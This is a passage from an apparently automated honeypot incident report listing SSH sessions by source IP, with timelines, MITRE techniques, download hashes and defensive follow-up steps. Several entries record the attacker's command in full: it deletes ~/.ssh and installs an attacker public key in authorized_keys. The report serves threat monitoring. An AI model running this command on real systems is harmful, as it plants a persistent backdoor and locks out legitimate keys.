| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:24:56` | `cowrie.session.connect` |
| `2026-05-11 04:24:56` | `cowrie.client.version` |
| `2026-05-11 04:24:56` | `cowrie.client.kex` |
| `2026-05-11 04:24:57` | `cowrie.login.success` |
| `2026-05-11 04:24:57` | `cowrie.session.params` |
| `2026-05-11 04:24:57` | `cowrie.command.input` |
| `2026-05-11 04:24:57` | `cowrie.command.failed` |
| `2026-05-11 04:24:57` | `cowrie.log.closed` |
| `2026-05-11 04:24:58` | `cowrie.session.params` |
| `2026-05-11 04:24:58` | `cowrie.command.input` |
| `2026-05-11 04:24:58` | `cowrie.session.file_download` |
| `2026-05-11 04:24:58` | `cowrie.log.closed` |
| `2026-05-11 04:25:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.123.146[.]94` to AbuseIPDB if not already reported
- [ ] Block `20.123.146[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-838b5b26dfbd

| Field | Detail |
|---|---|
| **Source IP** | `20.123.146[.]93` |
| **First Seen** | 2026-05-11 04:25 |
| **Last Seen** | 2026-05-11 04:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:25:00` | `cowrie.session.connect` |
| `2026-05-11 04:25:00` | `cowrie.client.version` |
| `2026-05-11 04:25:00` | `cowrie.client.kex` |
| `2026-05-11 04:25:01` | `cowrie.login.success` |
| `2026-05-11 04:25:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.123.146[.]93` to AbuseIPDB if not already reported
- [ ] Block `20.123.146[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d13d2e81b4a

| Field | Detail |
|---|---|
| **Source IP** | `4.210.186[.]201` |
| **First Seen** | 2026-05-11 04:28 |
| **Last Seen** | 2026-05-11 04:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:28:23` | `cowrie.session.connect` |
| `2026-05-11 04:28:23` | `cowrie.client.version` |
| `2026-05-11 04:28:23` | `cowrie.client.kex` |
| `2026-05-11 04:28:24` | `cowrie.login.success` |
| `2026-05-11 04:28:24` | `cowrie.session.params` |
| `2026-05-11 04:28:24` | `cowrie.command.input` |
| `2026-05-11 04:28:24` | `cowrie.command.failed` |
| `2026-05-11 04:28:24` | `cowrie.log.closed` |
| `2026-05-11 04:28:25` | `cowrie.session.params` |
| `2026-05-11 04:28:25` | `cowrie.command.input` |
| `2026-05-11 04:28:25` | `cowrie.session.file_download` |
| `2026-05-11 04:28:25` | `cowrie.log.closed` |
| `2026-05-11 04:28:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.210.186[.]201` to AbuseIPDB if not already reported
- [ ] Block `4.210.186[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02c896136847

| Field | Detail |
|---|---|
| **Source IP** | `20.123.146[.]92` |
| **First Seen** | 2026-05-11 04:28 |
| **Last Seen** | 2026-05-11 04:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:28:27` | `cowrie.session.connect` |
| `2026-05-11 04:28:27` | `cowrie.client.version` |
| `2026-05-11 04:28:27` | `cowrie.client.kex` |
| `2026-05-11 04:28:28` | `cowrie.login.success` |
| `2026-05-11 04:28:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.123.146[.]92` to AbuseIPDB if not already reported
- [ ] Block `20.123.146[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b112f1a524ba

| Field | Detail |
|---|---|
| **Source IP** | `20.123.146[.]94` |
| **First Seen** | 2026-05-11 04:29 |
| **Last Seen** | 2026-05-11 04:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:29:14` | `cowrie.session.connect` |
| `2026-05-11 04:29:14` | `cowrie.client.version` |
| `2026-05-11 04:29:14` | `cowrie.client.kex` |
| `2026-05-11 04:29:15` | `cowrie.login.success` |
| `2026-05-11 04:29:15` | `cowrie.session.params` |
| `2026-05-11 04:29:15` | `cowrie.command.input` |
| `2026-05-11 04:29:15` | `cowrie.command.failed` |
| `2026-05-11 04:29:15` | `cowrie.log.closed` |
| `2026-05-11 04:29:16` | `cowrie.session.params` |
| `2026-05-11 04:29:16` | `cowrie.command.input` |
| `2026-05-11 04:29:16` | `cowrie.session.file_download` |
| `2026-05-11 04:29:16` | `cowrie.log.closed` |
| `2026-05-11 04:29:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.123.146[.]94` to AbuseIPDB if not already reported
- [ ] Block `20.123.146[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74f55561dcd1

| Field | Detail |
|---|---|
| **Source IP** | `20.123.146[.]94` |
| **First Seen** | 2026-05-11 04:29 |
| **Last Seen** | 2026-05-11 04:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:29:18` | `cowrie.session.connect` |
| `2026-05-11 04:29:18` | `cowrie.client.version` |
| `2026-05-11 04:29:18` | `cowrie.client.kex` |
| `2026-05-11 04:29:19` | `cowrie.login.success` |
| `2026-05-11 04:29:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.123.146[.]94` to AbuseIPDB if not already reported
- [ ] Block `20.123.146[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b82d44b6fa10

| Field | Detail |
|---|---|
| **Source IP** | `4.210.186[.]201` |
| **First Seen** | 2026-05-11 04:40 |
| **Last Seen** | 2026-05-11 04:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:40:59` | `cowrie.session.connect` |
| `2026-05-11 04:40:59` | `cowrie.client.version` |
| `2026-05-11 04:40:59` | `cowrie.client.kex` |
| `2026-05-11 04:40:59` | `cowrie.login.success` |
| `2026-05-11 04:41:00` | `cowrie.session.params` |
| `2026-05-11 04:41:00` | `cowrie.command.input` |
| `2026-05-11 04:41:00` | `cowrie.command.failed` |
| `2026-05-11 04:41:00` | `cowrie.log.closed` |
| `2026-05-11 04:41:00` | `cowrie.session.params` |
| `2026-05-11 04:41:00` | `cowrie.command.input` |
| `2026-05-11 04:41:00` | `cowrie.session.file_download` |
| `2026-05-11 04:41:00` | `cowrie.log.closed` |
| `2026-05-11 04:41:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.210.186[.]201` to AbuseIPDB if not already reported
- [ ] Block `4.210.186[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3df6fa84b9c

| Field | Detail |
|---|---|
| **Source IP** | `20.123.146[.]92` |
| **First Seen** | 2026-05-11 04:41 |
| **Last Seen** | 2026-05-11 04:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:41:02` | `cowrie.session.connect` |
| `2026-05-11 04:41:02` | `cowrie.client.version` |
| `2026-05-11 04:41:02` | `cowrie.client.kex` |
| `2026-05-11 04:41:03` | `cowrie.login.success` |
| `2026-05-11 04:41:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.123.146[.]92` to AbuseIPDB if not already reported
- [ ] Block `20.123.146[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04ae32e24cda

| Field | Detail |
|---|---|
| **Source IP** | `165.154.227[.]158` |
| **First Seen** | 2026-05-11 04:44 |
| **Last Seen** | 2026-05-11 04:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:44:47` | `cowrie.session.connect` |
| `2026-05-11 04:44:47` | `cowrie.client.version` |
| `2026-05-11 04:44:47` | `cowrie.client.kex` |
| `2026-05-11 04:44:47` | `cowrie.login.success` |
| `2026-05-11 04:44:48` | `cowrie.session.params` |
| `2026-05-11 04:44:48` | `cowrie.command.input` |
| `2026-05-11 04:44:48` | `cowrie.command.failed` |
| `2026-05-11 04:44:48` | `cowrie.log.closed` |
| `2026-05-11 04:44:48` | `cowrie.session.params` |
| `2026-05-11 04:44:48` | `cowrie.command.input` |
| `2026-05-11 04:44:48` | `cowrie.session.file_download` |
| `2026-05-11 04:44:48` | `cowrie.log.closed` |
| `2026-05-11 04:44:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.227[.]158` to AbuseIPDB if not already reported
- [ ] Block `165.154.227[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88210b91d26e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.227[.]158` |
| **First Seen** | 2026-05-11 04:44 |
| **Last Seen** | 2026-05-11 04:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:44:50` | `cowrie.session.connect` |
| `2026-05-11 04:44:50` | `cowrie.client.version` |
| `2026-05-11 04:44:51` | `cowrie.client.kex` |
| `2026-05-11 04:44:51` | `cowrie.login.success` |
| `2026-05-11 04:44:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.227[.]158` to AbuseIPDB if not already reported
- [ ] Block `165.154.227[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adf98d309baa

| Field | Detail |
|---|---|
| **Source IP** | `165.154.227[.]158` |
| **First Seen** | 2026-05-11 04:47 |
| **Last Seen** | 2026-05-11 04:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:47:30` | `cowrie.session.connect` |
| `2026-05-11 04:47:30` | `cowrie.client.version` |
| `2026-05-11 04:47:30` | `cowrie.client.kex` |
| `2026-05-11 04:47:31` | `cowrie.login.success` |
| `2026-05-11 04:47:31` | `cowrie.session.params` |
| `2026-05-11 04:47:31` | `cowrie.command.input` |
| `2026-05-11 04:47:31` | `cowrie.command.failed` |
| `2026-05-11 04:47:31` | `cowrie.log.closed` |
| `2026-05-11 04:47:32` | `cowrie.session.params` |
| `2026-05-11 04:47:32` | `cowrie.command.input` |
| `2026-05-11 04:47:32` | `cowrie.session.file_download` |
| `2026-05-11 04:47:32` | `cowrie.log.closed` |
| `2026-05-11 04:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.227[.]158` to AbuseIPDB if not already reported
- [ ] Block `165.154.227[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcf4cd8a0c8d

| Field | Detail |
|---|---|
| **Source IP** | `165.154.227[.]158` |
| **First Seen** | 2026-05-11 04:47 |
| **Last Seen** | 2026-05-11 04:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:47:34` | `cowrie.session.connect` |
| `2026-05-11 04:47:34` | `cowrie.client.version` |
| `2026-05-11 04:47:34` | `cowrie.client.kex` |
| `2026-05-11 04:47:35` | `cowrie.login.success` |
| `2026-05-11 04:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.227[.]158` to AbuseIPDB if not already reported
- [ ] Block `165.154.227[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b26a92e02f4

| Field | Detail |
|---|---|
| **Source IP** | `165.154.227[.]158` |
| **First Seen** | 2026-05-11 04:52 |
| **Last Seen** | 2026-05-11 04:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:52:07` | `cowrie.session.connect` |
| `2026-05-11 04:52:07` | `cowrie.client.version` |
| `2026-05-11 04:52:07` | `cowrie.client.kex` |
| `2026-05-11 04:52:08` | `cowrie.login.success` |
| `2026-05-11 04:52:08` | `cowrie.session.params` |
| `2026-05-11 04:52:08` | `cowrie.command.input` |
| `2026-05-11 04:52:08` | `cowrie.command.failed` |
| `2026-05-11 04:52:08` | `cowrie.log.closed` |
| `2026-05-11 04:52:09` | `cowrie.session.params` |
| `2026-05-11 04:52:09` | `cowrie.command.input` |
| `2026-05-11 04:52:09` | `cowrie.session.file_download` |
| `2026-05-11 04:52:09` | `cowrie.log.closed` |
| `2026-05-11 04:52:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.227[.]158` to AbuseIPDB if not already reported
- [ ] Block `165.154.227[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89670a927702

| Field | Detail |
|---|---|
| **Source IP** | `165.154.227[.]158` |
| **First Seen** | 2026-05-11 04:52 |
| **Last Seen** | 2026-05-11 04:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:52:11` | `cowrie.session.connect` |
| `2026-05-11 04:52:11` | `cowrie.client.version` |
| `2026-05-11 04:52:11` | `cowrie.client.kex` |
| `2026-05-11 04:52:12` | `cowrie.login.success` |
| `2026-05-11 04:52:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.227[.]158` to AbuseIPDB if not already reported
- [ ] Block `165.154.227[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd28415fb162

| Field | Detail |
|---|---|
| **Source IP** | `165.154.227[.]158` |
| **First Seen** | 2026-05-11 04:56 |
| **Last Seen** | 2026-05-11 04:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:56:41` | `cowrie.session.connect` |
| `2026-05-11 04:56:41` | `cowrie.client.version` |
| `2026-05-11 04:56:41` | `cowrie.client.kex` |
| `2026-05-11 04:56:42` | `cowrie.login.success` |
| `2026-05-11 04:56:42` | `cowrie.session.params` |
| `2026-05-11 04:56:42` | `cowrie.command.input` |
| `2026-05-11 04:56:42` | `cowrie.command.failed` |
| `2026-05-11 04:56:42` | `cowrie.log.closed` |
| `2026-05-11 04:56:42` | `cowrie.session.params` |
| `2026-05-11 04:56:42` | `cowrie.command.input` |
| `2026-05-11 04:56:43` | `cowrie.session.file_download` |
| `2026-05-11 04:56:43` | `cowrie.log.closed` |
| `2026-05-11 04:56:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.227[.]158` to AbuseIPDB if not already reported
- [ ] Block `165.154.227[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1cbd29fe5b0

| Field | Detail |
|---|---|
| **Source IP** | `165.154.227[.]158` |
| **First Seen** | 2026-05-11 04:56 |
| **Last Seen** | 2026-05-11 04:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:56:45` | `cowrie.session.connect` |
| `2026-05-11 04:56:45` | `cowrie.client.version` |
| `2026-05-11 04:56:45` | `cowrie.client.kex` |
| `2026-05-11 04:56:45` | `cowrie.login.success` |
| `2026-05-11 04:56:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.227[.]158` to AbuseIPDB if not already reported
- [ ] Block `165.154.227[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3412aae7a9fc

| Field | Detail |
|---|---|
| **Source IP** | `114.220.238[.]30` |
| **First Seen** | 2026-05-11 06:49 |
| **Last Seen** | 2026-05-11 06:49 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 06:49:37` | `cowrie.session.connect` |
| `2026-05-11 06:49:37` | `cowrie.client.version` |
| `2026-05-11 06:49:38` | `cowrie.client.kex` |
| `2026-05-11 06:49:39` | `cowrie.login.success` |
| `2026-05-11 06:49:40` | `cowrie.session.params` |
| `2026-05-11 06:49:40` | `cowrie.command.input` |
| `2026-05-11 06:49:40` | `cowrie.command.failed` |
| `2026-05-11 06:49:41` | `cowrie.log.closed` |
| `2026-05-11 06:49:42` | `cowrie.session.params` |
| `2026-05-11 06:49:42` | `cowrie.command.input` |
| `2026-05-11 06:49:42` | `cowrie.session.file_download` |
| `2026-05-11 06:49:42` | `cowrie.log.closed` |
| `2026-05-11 06:49:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.220.238[.]30` to AbuseIPDB if not already reported
- [ ] Block `114.220.238[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96ffe1f2f351

| Field | Detail |
|---|---|
| **Source IP** | `114.220.238[.]30` |
| **First Seen** | 2026-05-11 06:49 |
| **Last Seen** | 2026-05-11 06:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
